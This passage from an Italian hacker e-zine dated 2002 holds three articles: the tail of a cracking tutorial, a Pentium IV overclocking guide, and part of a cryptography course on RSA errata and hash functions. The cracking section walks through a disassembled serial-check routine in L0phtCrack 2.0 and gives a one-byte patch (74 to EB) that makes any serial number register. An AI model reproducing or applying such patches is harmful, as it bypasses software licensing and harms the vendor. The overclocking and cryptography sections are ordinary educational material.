| Appena lo trovate clikkateci sopra due volte... piomberete cosi'         |
| all'interno del codice sorgente dove e' utilizzata questa stringa e      |
| da qui  non ci resta altro da fare che applicare il Dead Lisring         |
| approach :)                                                              |
|                                                                          |
|                                                                          |
| :004*1A26 50             push eax              ;Passaggio parametri      |
| :004*1A27 51             push ecx                                        |
| :004*1A28 E863940100     call 004*AE90         ;Funzione di controllo    |
| :004*1A2D 83C408         add esp, 00000008     ;del serial               |
| :004*1A30 85C0           test eax, eax         ;Test correttezza...      |
| :004*1A32 742C           je 004*1A60           ;Jmp se e' giusto...      |
| :004*1A34 57             push edi                                        |
| :004*1A35 57                                                             |
| 1000                                                                     |
|            push edi                                                      |
|                                                                          |
| * Possible StringData Ref from Data Obj ->"You have entered an           |
|                                            invalid code. "               |
|                                         ->"Please try again."            |
|                                   |                                      |
| :004*1A36 6820A24400              push 0044A220                          |
| :004*1A3B E874DD0200              call 004*F7B4                          |
| :004*1A40 56                      push esi                               |
| :004*1A41 8D8C24CC000000          lea ecx, dword ptr [esp+000000CC]      |
| :004*1A48 E874420200              call 004*5CC1                          |
| :004*1A4D 8D4C246C                lea ecx, dword ptr [esp+6C]            |
| :004*1A51 E8392B0200              call 004*458F                          |
| :004*1A56 83F801                  cmp eax, 00000001                      |
| :004*1A59 74A0                    je 004*19FB                            |
| :004*1A5B E9A7000000              jmp 004*1B07                           |
|                                                                          |
| * Referenced by a (U)nconditional or (C)onditional Jump at Address:      |
| |:004*1A32(C)                                                            |
| |                                               ;Se e' giusto registra   |
|                                                  il code                 |
|                                                 ;nel Registo...          |
| :004*1A60 89BDC0000000            mov dword ptr [ebp+000000C0], edi      |
|                                                                          |
| * Possible StringData Ref from Data Obj ->"Software\LHI\L0phtCrack"      |
|                                   |                                      |
| :004*1A66 BF08A24400              mov edi, 0044A208                      |
| :004*1A6B 83C9FF                  or ecx, FFFFFFFF                       |
| :004*1A6E 33C0                    xor eax, eax                           |
| .....                                                                    |
| .....                                                                    |
| .....                                                                    |
| .....                                                                    |
|                                                                          |
| * Possible StringData Ref from Data Obj ->"You have successfully         |
|                                            registered "                  |
|                                         ->"L0phtCrack 2.0."              |
|                                   |                                      |
| :004*1AFB 68C4A14400              push 0044A1C4                          |
| :004*1B00 E8AFDC0200              call 004*F7B4                          |
| :004*1B05 33FF                    xor edi, edi                           |
|                                                                          |
| In pratica dovreste aver capito che il programma fa controllare          |
| ad una funzione se il SN e' corretto... e se lo e' lo scrive nel         |
| registro di configurazion, altrimenti non esegue il jmp e visualizza     |
| il messaggio di errore che noi ben conosciamo hihihih                    |
| Volete sapere cosa facciamo? beh Φ molto semplice ... bisogna entrare    |
| all'interno della call:                                                  |
|                                                                          |
| :004*1A28 E863940100              call 004*AE90                          |
|                                                                          |
| (attenzione ricordatevi che la funzione ritorna '0' se il                |
| SN e' corretto e ritorna '1' se il SN e' sbagliato !!!)                  |
|                                                                          |
| * Referenced by a CALL at Addresses:                                     |
| |:004*1938   , :004*1A28   , :004*2C34   , :004*4207   , :004*429E       |
| |:004*44A3   , :004*44BC   , :004*44D5   , :004*44EE   , :004*876E       |
| |:004*8B87                              ;Uh..uh... molte call a questa   |
| |                                       ;funzione.... OTTIMO ;)          |
| |                                       ;vuol dire che essa e'           |
|                                          richiamata                      |
| |                                       ;anche in altri punti del        |
|                                          programma :)                    |
| :004*AE90 55                      push ebp                               |
| :004*AE91 8BEC                    mov ebp, esp                           |
| :004*AE93 57                      push edi                               |
| :004*AE94 56                      push esi                               |
| :004*AE95 53                      push ebx                               |
| :004*AE96 8B750C                  mov esi, dword ptr [ebp+0C] <- SN      |
|                                   corretto                               |
| :004*AE99 8B7D08                  mov edi, dword ptr [ebp+08] <- SN      |
|                                   inserito..                             |
| :004*AE9C 8D0540F74400            lea eax, dword ptr [0044F740]          |
| :004*AEA2 83780800                cmp dword ptr [eax+08], 00000000       |
| :004*AEA6 753B                    jne 004*AEE3                           |
| :004*AEA8 B0FF                    mov al, FF                             |
| :004*AEAA 8BC0                    mov eax, eax                           |
|                                                                          |
| * Referenced by a (U)nconditional or (C)onditional Jump at Addresses:    |
| |:004*AEB8(C), :004*AED8(C)                                              |
| |                                                                        |
| :004*AEAC 0AC0             -----> or al, al    <- Controlla se si e'     |
|                           |                       arrivati               |
| :004*AEAE 742E            |       je 004*AEDE     alla fine della        |
|                           |                       stringa...             |
| :004*AEB0 8A06            |       mov al, byte ptr [esi] <- 1° char      |
|                           |                       in "al"                |
| :004*AEB2 46              |       inc esi  <- fa scorrere il SN          |
|                           |                   corretto...                |
| :004*AEB3 8A27            |       mov ah, byte ptr [edi] <- 2° char      |
|                           |                    in "ah"                   |
| :004*AEB5 47              |       inc edi  <- fa scorrere il SN          |
|                           |                   inserito...                |
| :004*AEB6 38C4                                                           |
| 1000                                                                     |
|     |       cmp ah, al  <- se sono uguali passa al char                  |
| :004*AEB8 74F2             ------ je 004*AEAC    successivo              |
| :004*AEBA 2C41                    sub al, 41                             |
| :004*AEBC 3C1A                    cmp al, 1A                             |
| :004*AEBE 1AC9                    sbb cl, cl                             |
| :004*AEC0 80E120                  and cl, 20                             |
| :004*AEC3 02C1                    add al, cl                             |
| :004*AEC5 0441                    add al, 41                             |
| :004*AEC7 86E0                    xchg al, ah                            |
| :004*AEC9 2C41                    sub al, 41                             |
| :004*AECB 3C1A                    cmp al, 1A                             |
| :004*AECD 1AC9                    sbb cl, cl                             |
| :004*AECF 80E120                  and cl, 20                             |
| :004*AED2 02C1                    add al, cl                             |
| :004*AED4 0441                    add al, 41                             |
| :004*AED6 38E0                    cmp al, ah                             |
| :004*AED8 74D2                    je 004*AEAC <- idem....                |
| :004*AEDA 1AC0                    sbb al, al                             |
| :004*AEDC 1CFF                    sbb al, FF                             |
|                                                                          |
| * Referenced by a (U)nconditional or (C)onditional Jump at Address:      |
| |:004*AEAE(C)                                                            |
| |                                              <- mette in "al"          |
|                                                   l'ultimo char          |
| :004*AEDE 0FBEC0                  movsx eax, al   (se il SN e' giusto    |
|                                                    al=00)                |
|                                                   dato che siamo         |
|                                                   arrivati in            |
|                                                   fondo alla stringa     |
| :004*AEE1 EB78                    jmp 004*AF5B <- salta alla fine        |
|                                                   della                  |
|                                                   funzione ;)            |
| * Referenced by a (U)nconditional or (C)onditional Jump at Address:      |
| |:004*AEA6(C)                                                            |
| |                                                                        |
| :004*AEE3 F0                      lock                                   |
|                                                                          |
| ..................                                                       |
| ...............                                                          |
| ............                                                             |
|                                                                          |
| ecc... ecc.....                                                          |
|                                                                          |
|                                                                          |
| * Referenced by a (U)nconditional or (C)onditional Jump at Address:      |
| |:004*AEE1(U)                                                            |
| |                                                                        |
| :004*AF5B 5B                      pop ebx                                |
| :004*AF5C 5E                      pop esi                                |
| :004*AF5D 5F                      pop edi                                |
| :004*AF5E C9                      leave                                  |
| :004*AF5F C3                      ret                                    |
|                                                                          |
| il problema sta nel far ritornare alla funzione il valore 00 come ???    |
| basta far scorrere la stringa fino alla fine, quindi bastera'            |
| modificare il jump condizionale:                                         |
|                                                                          |
| :004*AEB8 74F2             je 004*AEAC                                   |
| in un bel "JMP" cioe':                                                   |
| :004*AEB8 EBF2             jmp 004*AEAC                                  |
|                                                                          |
| Fatto ! ora prendete il file offset... cioe' 1*2*8  segnatevelo...       |
| Aprite il vostro hexeditor di fiducia, fate un Goto a 1*2*8... e         |
| modificate il byte "74" in "EB"... Uscite e SALVATE !!!                  |
| Riavviate il l0pht che vi chiedera' ancora di registrarvi bene...        |
| inserite un Sn a caso e vedrete che il programma vi ringraziera'         |
| tutto contento.                                                          |
| Tutto qui ragazzi Φ finita questa lezione e spero di avervi kiarito      |
| le idee per quanto riguarda il cracking.                                 |
| ciao a tutti CYBERDUDE                                                   |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'APPRENDiSTA STREG0NE                     #08 - 01/11/2002 |
| 0VERCL0CK ESTREM0 Di UN PENTiUM IV 1600                  [DJK] 0x17/0x1A |
+--------------------------------------------------------------------------+
| ***********************************************************************  |
| DISCLAIMER: Una qualsiasi modifica dei paramerti di tensione e           |
| frequenza della mainboard puo' portare, nel peggiore dei casi, ad un     |
| danneggiamento dell'hardware. Effettuare queste modifiche con metodo e   |
| accuratezza puo' ridurre al minimo il rischio di danni al computer, ma   |
| non mi ritengo assolutamente responsabile se bruciate la CPU o           |
| qualsiasi altro componente. Utilizzate queste informazioni a vostro      |
| rischio e pericolo!                                                      |
| ***********************************************************************  |
|                                                                          |
| Per overclock solitamente si intendono tutte quelle procedure che        |
| consentono di ottenere maggiori prestazioni dal proprio computer senza   |
| dover cambiare il processore. Solitamente uno dei fattori che incide     |
| maggiormente sull'acquisto di un computer e' proprio il processore,      |
| che                                                                      |
| e' anche il componente che si deprezza maggiormente nel tempo: se si     |
| acquista l'ultimissimo modello dopo 3 o 4 mesi il suo prezzo quasi si    |
| dimezza, con somma incazzatura di chi se l'era comprato! Chi utilizza    |
| il computer per lavoro o per divertimento, pero', puo' ottenere          |
| prestazioni extra modificando i parametri della CPU e portandoli a       |
| valori diversi da quelli stabiliti dalla casa produttrice. I nuovi AMD   |
| Athlon XP ed Intel Pentium IV hanno dei buoni margini di overclock,      |
| per                                                                      |
| cui puo' valere davvero la pena smanettare un po' per ottenere le        |
| prestazioni dei modelli piu' recenti (e costosi).                        |
|                                                                          |
| Un buon overclock dipende sostanzialmente da quattro parametri:          |
| processore, scheda madre, memoria, circolazione d'aria. La scheda        |
| madre                                                                    |
| deve essere di buona qualita', avere un chipset che supporta             |
| l'overclock e la possibilita' di modificare i principali parametri       |
| della CPU e della memoria (dal BIOS o sulla scheda tramite jumpers)      |
| quali il Front Side Bus, il Vcore, il Vdimm. La memoria deve essere in   |
| grado di lavorare a frequenze di sistema alte in modo stabile, ed il     |
| processore deve essere tollerante all'overclock. Una buona               |
| circolazione                                                             |
| d'aria e' fondamentale per garantire una bassa temperatura di sistema,   |
| e di conseguenza una piu' bassa temperatura di partenza per la CPU.      |
| Ogni processore ha un margine di overclock diverso, due identici         |
| modelli di processore possono avere frequenze massime di utilizzo        |
| molto                                                                    |
| diverse.                                                                 |
|                                                                          |
| Per il mio primo articolo su OndaQuadra (e speriamo non sia l'ultimo!)   |
| ho pensato di mostrarvi come si puo' overclockare un processore dal      |
| costo non elevato e che forse potreste gia' avere nel vostro computer    |
| di casa, un Pentium IV 1600 MHz. Ecco la configurazione che ho           |
| utilizzato:                                                              |
|                                                                          |
| Motherboard: DFI NB76-EA                                                 |
| Processore: Intel Pentium IV 1.6A Northwood                              |
| Memoria: 512MB DDR 333 MHz                                               |
| Hard Disk: Quantum Fireball AS 30GB                                      |
| DVD-ROM: Philips 16x                                                     |
| Sistema operativo: Windows 98SE                                          |
|                                                                          |
| Per il sistema di raffreddamento ho adottato un dissipatore ad aria      |
| dalle grandi prestazioni, l'Evercool CUW1F-715, uno dei piu'             |
| performanti e silenziosi in circolazione. Ha un costo non troppo         |
| elevato (circa 55 Euro), ma e' uno dei pochi modelli ad aria che         |
| consente di effettuare overclock estremi senza correre il rischio di     |
| bruciare il processore. Oltre a questo dissipatore ho usato per questo   |
| articolo anche altri coolers (Swiftech MCX478, Zalman CNPS6500B-Cu,      |
| Zalman CNPS6500B-AlCu) dal costo ben piu' elevato (rispettivamente       |
| 125,                                                                     |
| 72 e 62 Euro), ma l'Evercool CUW1F-715 e' quello con il miglior          |
| rapporto prestazioni/prezzo. Ho preferito non utilizzare un sistema di   |
| raffreddamento ad acqua, sia perche' ha costi ben piu' elevati sia per   |
| il fatto che richiede una continua manutenzione, poiche' una goccia      |
| d'acqua sulla motherboard a computer acceso potrebbe risultare           |
| fatale.                                                                  |
| La scheda madre DFI NB76-EA e' una mainboard molto efficiente che        |
| consente di effettuare overclock di grande portata mantenendo al         |
| massimo la stabilita' del sistema e di fatto azzerando le possibilita'   |
| di bruciare il processore grazie alla sua tecnologia BitGuard. Per il    |
| raffreddamento del case ho utilizzato due ventole CoolerMaster DAF-B82   |
| termoregolate da 80x80x25mm, ma approfondiremo il discorso sul           |
| raffreddamento del case una prossima volta. Tutto questo materiale non   |
| e' semplicissimo da reperire in Italia, ma si puo' trovare su            |
| Overclock                                                                |
| PC Italia (www.overclockitalia.tk o www.overclockpcitalia.cjb.net) a     |
| buon prezzo.                                                             |
|                                                                          |
| Il Pentium IV ha il moltiplicatore bloccato a 16, per cui l'unico modo   |
| per effettuare un overclock e' agire sul Front Side Bus (FSB), settato   |
| di fabbrica a 100 MHz. Cerchero' di descrivere in linea generale come    |
| va effettuato un overclock, operazione che richiede un po' di tempo e    |
| pazienza se si vogliono ottenere risultati discreti. Conviene            |
| innanzitutto lavorare a case aperto, per controllare l'efficienza        |
| delle                                                                    |
| ventole ed avere la possibilita' di accedere ai jumpers per cambiare i   |
| parametri della scheda madre, nel caso in cui questa non fosse           |
| jumperless. Dal BIOS (o a computer spento tramite i jumpers) si          |
| aumenta                                                                  |
| la frequenza di FSB a passi di qualche MHz, e si avvia la macchina: se   |
| il computer si blocca dopo pochi secondi o il monitor rimane nero,       |
| vuol                                                                     |
| dire che la frequenza di FSB impostata e' troppo elevata e bisogna       |
| diminuirla. Una volta lanciato il sistema operativo, utilizzare          |
| applicazioni che richiedono un gran numero di risorse di sistema, come   |
| benchmark o giochi ad alta definizione, e verificare che il sistema      |
| sia                                                                      |
| o meno stabile: schermate blu, reset improvvisi, programmi che si        |
| bloccano sono indici di una instabilita' del computer, e come si puo'    |
| ben capire un overclock instabile non serve a niente! Se la macchina     |
| risulta stabile si puo' procedere ad un successivo innalzamento dell'    |
| FSB, in caso negativo occorre aumentare la stabilita' del sistema:       |
| occorre agire sulla tensione di lavoro della CPU, Vcore, ed aumentarla   |
| a piccoli passi di 0.01 Volt fino a quando non si ottengono              |
| miglioramenti. I processori Pentium IV Northwood operano solitamente a   |
| 1.5 Volt, conviene limitare il piu' possibile gli aumenti di tensione    |
| perche' ad un aumento di Vcore corrisponde una maggiore quantita' di     |
| calore che la CPU produce.                                               |
|                                                                          |
| Aumentando l'FSB si costringono gli slot PCI ed AGP a lavorare a         |
| frequenze diverse da quelle di specifica, ed alcune periferiche come i   |
| controller SCSI potrebbero risentirne: per questo motivo si possono      |
| settare i divisori di frequenza per gli slot PCI (che lavorano           |
| solitamente a 33 MHz) e gli AGP (che lavorano a 66 MHz)  in modo da      |
| restare il piu' possibile entro le specifiche. Molte schede madri        |
| permettono in oltredi poter utilizzare le memorie ad una frequenza       |
| diversa da quella del FSB, per cui l'argomento dell'overclock delle      |
| memorie lo tratteremo in separata sede.                                  |
|                                                                          |
| Tornando al nostro Pentium IV 1600 MHz, il nostro primo passo e'         |
| quello                                                                   |
| di aumentare il FSB a 133 MHz, poiche' molti processori Northwood        |
| riescono a lavorare bene a questa frequenza ed essere molto stabili,     |
| spesso senza dover ritoccare il Vcore. In un attimo abbiamo raggiunto    |
| un incremento di prestazioni del 33%, arrivando a quota 133 * 16 =       |
| 2128                                                                     |
| MHz. Da qui in poi la strada e' tutta in salita, si applica il           |
| procedimento descritto sopra aumentando il FSB a passi i piu' piccoli    |
| possibili e dando sempre un'occhiata alla temperatura del processore e   |
| quella di sistema. Per nostra fortuna il sistema di raffreddamento da    |
| noi scelto consente un'ottima circolazione d'aria nel case, e lo         |
| Zalman                                                                   |
| CNPS6500B-Cu e' in grado di mantenere bassa la temperatura della CPU.    |
| Dopo circa due ore e mezzo di smanettamenti, arriviamo all'ambito        |
| traguardo di 175 MHz di FSB, che portano il nostro processore            |
| all'incredibile frequenza di 175 * 16 = 2800 MHz con un Vcore di         |
| 1.85V.                                                                   |
| A 176 MHz la macchina rifiuta di accendersi, ma possiamo ritenerci       |
| piu'                                                                     |
| che soddisfatti del risultato ottenuto! Il nostro e' stato senza         |
| dubbio                                                                   |
| un processore molto "fortunato", ma con altri processori si possono      |
| comunque ottenere dei margini di miglioramento molto interessanti.       |
|                                                                          |
| L' Evercool CUW1F-715 non e' l'unico dissipatore ad aria che permette    |
| overclock di grande portata, ne esistono anche altri dal prezzo          |
| inferiore che consentono di ottenere comunque degli ottimi risultati,    |
| per un consiglio potete chiedere a me o andare sul sito di Overclock     |
| PC                                                                       |
| Italia.                                                                  |
|                                                                          |
| DJK - djk@gmx.it                                                         |
+--------------------------------------------------------------------------+



+--------------------------------------------------------------------------+
| ONDAQUADRA ~ L'APPRENDiSTA STREG0NE                     #08 - 01/11/2002 |
| C0DiCE iNVERS0 PARTE 5                                  [Zer0] 0x18/0x1A |
+--------------------------------------------------------------------------+
| Orbene, rieccoci al dunque. CODiCE iNVERSO sta diventando qualcosa di    | 
| mostruoso, e visto che stavolta me la sono presa comoda per varie        | 
| ragioni matematicostoricopoliticoletterarie il tempo stringe. Vi chiedo  | 
| di perdonarmi quindi se stavolta saltero' la solita intro di cazzate e   | 
| andro' subito al sodo.                                                   | 
|                                                                          | 
|                                                                          | 
| &lt;ERRATA CORRIGE DELLE PUNTATE PRECEDENTI>                                | 
|                                                                          | 
| Nella scorsa puntata, non so per quale nefasto intervento di non so      | 
| quale diavolo digitale, sono stati scazzati alcuni caratteri nelle       | 
| formule degli algoritmi asimmetrici. Per la precisione e' stato          | 
| scambiato il carattere apice ( ^ ) con il carattere virgolette ( " ), ma | 
| non e' avvenuto il viceversa. Troverete quindi elevamenti a potenza      | 
| tipo:                                                                    | 
|                                                                          | 
|         ya = g^a (Mod p)                                                 | 
|                                                                          | 
| che appariranno come:                                                    | 
|                                                                          | 
|         ya = g"a (Mod p)                                                 | 
|                                                                          | 
| Stesso discorso per lo Xor, che invece di apparire come ^^ appare come   | 
| "". Non so a cosa sia dovuta la cosa, quando leggete le formule siate    | 
| intuitivi che tanto e' facile capire dov'e' che un "virgolette" sta      | 
| davvero per "virgolette" oppure per "apice".                             | 
|                                                                          | 
| Poi c'e' stata una discreta imprecisione al paragrafo "CRITTOSISTEMI     | 
| ASIMMETRICI: ISTRUZIONI PER L'USO" del capitolo 7, nella spiegazione     | 
| della relazione O(x) riguardo alla complessita' degli algoritmi, la      | 
| definizione giusta e' la seguente:                                       | 
|                                                                          | 
| La complessita' di un algoritmo normalmente si misura secondo due        | 
| fattori: T (complessita' di tempo) e S (complessita' di spazio o         | 
| requisiti di memoria), che sono normalmente entrambe espressi in         | 
| funzione di n, dove n e' la dimensione in bit degli input (la dimensione | 
| del problema). La complessita' computazionale totale di un certo         | 
| algoritmo si esprime secondo la notazione O(x), dove x rappresenta       | 
| l'ordine di grandezza della complessita' di tempo o di spazio,           | 
| normalmente di tempo. Cioe' x e' il termine della funzione di            | 
| complessita' di tempo che cresce piu' in fretta, eventuali coefficienti  | 
| o termini di grado inferiore vengono ignorati, perche' non sono decisivi | 
| al crescere di n. Se ad esempio la complessita' di tempo di un dato      | 
| algoritmo e':                                                            | 
|                                                                          | 
|         5(n^3) - 2(n^2) + 5                                              | 
|                                                                          | 
| la sua complessita' O(x) sara' espressa semplicemente come:              | 
|                                                                          | 
|         O(n^3)                                                           | 
|                                                                          | 
| Questa notazione permette di capire a vista d'occhio come variera' il    | 
| tempo di risoluzione di un dato problema con quell'algoritmo             | 
| all'aumentare della dimensione del problema. Se ad esempio un algoritmo  | 
| e' O(n), significa che raddoppiando la sua dimensione raddoppiera' anche | 
| il tempo di risoluzione (entro limiti ragionevolmente accettabili,       | 
| quindi salvo costanti o altre piccole variabili). Se invece un algoritmo | 
| e' O(n^2) significa che raddoppiando la dimensione degli input il tempo  | 
| di risoluzione quadruplica etc... Gli algoritmi possono essere cosi'     | 
| classificati a seconda della loro complessita': un algoritmo si dice     | 
| COSTANTE se la sua complessita' e' indipendente da n: O(k) dove k e'     | 
| costante numerica. Si dice LINEARE se la sua complessita' e' O(n),       | 
| QUADRATICO se e' O(n^2), CUBICO se e' O(n^3) etc... Tutti questi         | 
| algoritmi sono POLINOMIALI: la loro complessita' e' O(n^k), dove k e'    | 
| una costante. Questa classe di algoritmi si dice "in tempo polinomiale", | 
| o "in P". Algoritmi di complessita' O(t^f(n)), dove t e' una costante    | 
| maggiore di 1 e f(n) e' una funzione polinomiale di n si dicono          | 
| ESPONENZIALI. Algoritmi di complessita' O(t^f(n)), dove t e' maggiore di | 
| 1 e f(n) e' piu' di una costante ma meno che lineare si dicono           | 
| SUPERPOLINOMIALI (o SUBESPONENZIALI).                                    | 
|                                                                          | 
|                                                                          | 
| E ancora: c'e' stato non un errore, bensi' un ORRORE nel capitolo 7,     | 
| alla spiegazione dell'algoritmo RSA. A un certo punto si spiega come mai | 
| il modulo della funzione RSA non puo' essere un numero primo: si         | 
| ipotizza che tale modulo sia un numero primo e assumendo tale ipotesi si | 
| mostra in che modo un attacker (Eve) potrebbe riuscire a calcolare       | 
| l'esponente segreto "d" di decrittazione utilizzando l'EEA. Solo che il  | 
| procedimento descritto e' sbagliato. Per calcolare l'esponente non si    | 
| deve calcolare "d" tale che e*d Mod M = 1, bensi' e*d Mod N(M) = 1. In   | 
| pratica il seguente passaggio:                                           | 
|                                                                          | 
|  [cut here]                                                              | 
|                                                                          | 
| Infatti, ipotizzando che M fosse un numero primo, se noi abbiamo K' e    | 
| sappiamo che:                                                            | 
|                                                                          | 
|         K' = K^e Mod M                                                   | 
|                                                                          | 
| per trovare K eleviamo entrambi i membri all'esponente "d" (che non      | 
| conosciamo):                                                             | 
|                                                                          | 
|         K'^d  =  K^ed    (Mod M)                                         | 
|                                                                          | 
| Ora, se noi scegliamo "d" in modo tale che:                              | 
|                                                                          | 
|         e*d Mod M = 1                                                    | 
|                                                                          | 
| la scrittura sopra si riduce a:                                          | 
|                                                                          | 
|         K'^d  =  K^1  (Mod M)   --->   K'^d Mod M = K                    | 
|                                                                          | 
| Trovare uno "d" tale che  e*d Mod M = 1  equivale a calcolare l'inverso  | 
| moltiplicativo di "e" modulo M, cosa che sappiamo Eve potrebbe fare      | 
| tranquillamente. Insomma, M non pu≥ essere un numero primo.              | 
|                                                                          | 
|  [cut here]                                                              | 
|                                                                          | 
| va sostituito con questo:                                                | 
|                                                                          | 
|  [cut here]                                                              | 
|                                                                          | 
| Infatti, ipotizzando che M fosse un numero primo, se noi abbiamo K' e    | 
| sappiamo che:                                                            | 
|                                                                          | 
|         K' = K^e Mod M                                                   | 
|                                                                          | 
| per trovare K eleviamo entrambi i membri all'esponente "d" (che non      | 
| conosciamo):                                                             | 
|                                                                          | 
|         K'^d  =  K^ed    (Mod M)                                         | 
|                                                                          | 
| Ora, se noi scegliamo "d" in modo tale che:                              | 
|                                                                          | 
|         e*d Mod N(M) = 1                                                 | 
|                                                                          | 
| la scrittura sopra si riduce a:                                          | 
|                                                                          | 
|         K'^d  =  K^1  (Mod M)   --->   K'^d Mod M = K                    | 
|                                                                          | 
| Trovare uno "d" tale che  e*d Mod N(M) = 1  equivale a calcolare         | 
| l'inverso moltiplicativo di "e" modulo N(M), cosa che sappiamo Eve       | 
| potrebbe fare tranquillamente. Insomma, M non pu≥ essere un numero       | 
| primo.                                                                   | 
|                                                                          | 
|  [cut here]                                                              | 
|                                                                          | 
|                                                                          | 
| Infine un'ultima cosa riguardo al capitolo 6, nel punto in cui spiega la | 
| modalita' CFB si dice che il PGP utilizza appunto questa modalita'. E    | 
| infatti e' vero, ma leggendo bene si poteva anche intendere "il PGP usa  | 
| modalita' CFB con funzioni one-way", cosa falsa. Non confondetevi, il    | 
| PGP usa la CFB sempre con algoritmi comunque two-way, tipo IDEA e CAST.  | 
|                                                                          | 
| &lt;/ERRATA CORRIGE>                                                        | 
|                                                                          | 
|                                                                          | 
| Ricordo che usero' il termine "arduo" per intendere "computazionalmente  | 
| insostenibile". Inoltre i termini "hash", "message digest", "checksum"   | 
| e "fingerprint" saranno considerati sinonimi. Stessa cosa per "nemico",  | 
| "eavesdropper", "attaccante", "attacker", "avversario", "crittanalista", | 
| "intercettatore" et affini.                                              | 
|                                                                          | 
|                                                                          | 
| +----------------------------------------------------------------------+ | 
| | FUNZIONI DI HASHING                                                  | | 
| | . . . . . . *--------------------------------------------------------+ | 
| |Capitolo 8  /                                    I got my hash pipe!... | 
| +-----------*                                                            | 
|                                                                          | 
| Le funzioni di hash hanno assunto un'importanza mostruosa nella          | 
| crittografia moderna, molto piu' di algoritmi simmetrici e asimmetrici.  | 
| Con una buona funzione hash potete fare praticamente di tutto: crittare  | 
| messaggi tramite CFB, autenticare una password senza salvare su server   | 
| la password in chiaro, verificare l'eventuale alterazione di un          | 
| documento, verificare l'identita' di un interlocutore remoto, dimostrare | 
| ad un altro interlocutore che conoscete un segreto SENZA rivelargli il   | 
| segreto e un sacco di altre cose. Data la loro utilita' e versatilita',  | 
| le funzioni di hashing sono largamente usate in ogni crittosistema che   | 
| si rispetti, motivo per cui lo studio della sicurezza di queste          | 
| funzioni e' cruciale per tutto il resto.                                 | 
|                                                                          | 
| Ma domanda: che roba e' una funzione hash?                               | 
|                                                                          | 
|                                                                          | 
| ===================                                                      | 
| *** DEFINIZIONI ***                                                      | 
| ===================                                                      | 
|                                                                          | 
| Per "funzione hash" o " funzione hashing" normalmente si intendono un    | 
| sacco di cose diverse. Tale definizione infatti comprende in realta'     | 
| varie classi differenti di funzioni, i cui scopi possono non essere      | 
| uguali. Tutte le funzioni H() di hash a utilizzo crittografico devono    | 
| pero' condividere le seguenti proprieta':                                | 
|                                                                          | 
|  - la descrizione e il funzionamento di H() sono noti e pubblicamente    | 
|    reperibili (in attinenza al Principio di Kerchoff)                    | 
|                                                                          | 
|  - trasformano un messaggio M di lunghezza arbitraria in un Message      | 
|    Digest MD di lunghezza prefissata                                     | 
|                                                                          | 
| Questa seconda proprieta' afferma in pratica che una funzione hash NON   | 
| E' INIETTIVA, e quindi non e' invertibile. Ne deriva una terza           | 
| osservazione:                                                            | 
|                                                                          | 
|  - dato un certo message digest MD non e' mai possibile sapere con       | 
|    certezza assoluta qual'e' stato il messaggio M che l'ha generato.     | 
|                                                                          | 
| Date queste "linee guida", passiamo a definire classi diverse di         | 
| funzioni hash.                                                           | 
|                                                                          | 
|                                                                          | 
|   < One-Way Hash Function >                                              | 
|                                                                          | 
| Una funzione H() di hash si dice one-way se soddisfa le seguenti         | 
| proprieta':                                                              | 
|  - dato un messaggio M, e' facile calcolare H(M).                        | 
|  - dato un certo MD nel codominio di H(), e' arduo trovare un messaggio  | 
|    M tale che H(M) = MD.                                                 | 
|  - dati un messaggio M e l'hash H(M), e' arduo trovare un secondo        | 
|    messaggio M' != M tale che H(M) = H(M').                              | 
|                                                                          | 
|                                                                          | 
|   < Collision-Free Hash Function >                                       | 
|                                                                          | 
| Una funzione hash resistente alle collisioni e' una funzione hash        | 
| one-way che ha anche la seguente proprieta':                             | 
|  - e' arduo trovare due distinti messaggi M e M' tali che il loro        | 
|    hash sia uguale (cioe' H(M) = H(M')).                                 | 
| Questa proprieta' e' molto diversa dalla terza proprieta' delle funzioni | 
| hash one-way, quella infatti prevede di trovare un secondo messaggio     | 
| quando il primo e' gia' noto, qui invece si puo' trovare una coppia di   | 
| messaggi qualsiasi, in totale indipendenza.                              | 
| Da notare inoltre che in ogni funzione hash c'e' sempre almeno un MD che | 
| puo' essere generato da piu' di un messaggio, anzi, di solito ogni MD    | 
| puo' essere generato da piu' di un messaggio, solo che qui deve essere   | 
| difficile trovare anche solo due di tali messaggi.                       | 
|                                                                          | 
|                                                                          | 
|   < Keyed Hash Function >                                                | 
|                                                                          | 
| Una funzione H() di hash a chiave accetta in entrata un messaggio M di   | 
| lunghezza arbitraria e una chiave K di lunghezza fissata, e restituisce  | 
| un hash MD di lunghezza fissata. L'hash prodotto, cioe', cambia per uno  | 
| stesso messaggio a seconda della chiave inserita. Oltre alle sopracitate | 
| proprieta' generali, una keyed hash function deve avere le seguenti      | 
| caratteristiche:                                                         | 
|  - dati K e M, e' facile calcolare H(K, M).                              | 
|  - senza conoscere K, e' arduo sia trovare M quando e' noto H(K, M), sia | 
|    trovare due distinti messaggi M e M' tali che H(K, M) = H(K, M')      | 
|    (queste due proprieta' sono opzionali se K e' nota).                  | 
|  - date alcune (possibilmente molte) coppie hash-messaggio               | 
|    {M[i], MD[i]}, con MD[i] = H(K, M[i]), e' arduo trovare la chiave     | 
|    segreta K usata.                                                      | 
|  - senza conoscere K, e' arduo determinare H(K, M) per qualsiasi         | 
|    messaggio M, anche se si conoscono molte coppie hash-messaggio        | 
|    {M[i], MD[i]} in cui M[i] sia scelto dal nemico.                      | 
|                                                                          | 
|                                                                          | 
|   < Collisionful Hash Function >                                         | 
|                                                                          | 
| Una funzione H() di hash collidente e' progettata in modo da favorire    | 
| una certa possibilita' di collisione invece di evitarla. Questo strano   | 
| tipo di funzione a chiave e' stato proposto allo scopo di rendere piu'   | 
| difficile l'individuazione della chiave corretta. Tale funzione deve     | 
| avere le seguenti proprieta':                                            | 
|  - dati K e M, e' facile calcolare H(K, M).                              | 
|  - data K, e' arduo trovare due distinti messaggi M e M' tali che        | 
|    H(K, M) = H(K, M').                                                   | 
|  - date "t" coppie di {M[i], MD[i]}, con MD[i] = H(K, M[i]) e            | 
|    i = {1, 2, àt}, e' arduo trovare K, anche se e' meno arduo trovare    | 
|    una K' != K, con H(K, M[i]) = H(K', M[i]) per tutti e t gli M[i].     | 
|  - senza conoscere K, e' arduo determinare H(K, M) per qualsiasi         | 
|    messaggio M, anche se si conoscono molte coppie hash-messaggio        | 
|    {M[i], MD[i]} in cui M[i] sia scelto dal nemico.                      | 
|                                                                          | 
|                                                                          | 
| Esistono anche altre stranissime classi di funzioni hash, che pero' a    | 
| noi non interessano e che quindi lascero' perdere.                       | 
|                                                                          | 
|                                                                          | 
|                                                                          | 
| ============================================                             | 
| *** STRUTTURA DI UN ALGORITMO DI HASHING ***                             | 
| ============================================                             | 
|                                                                          | 
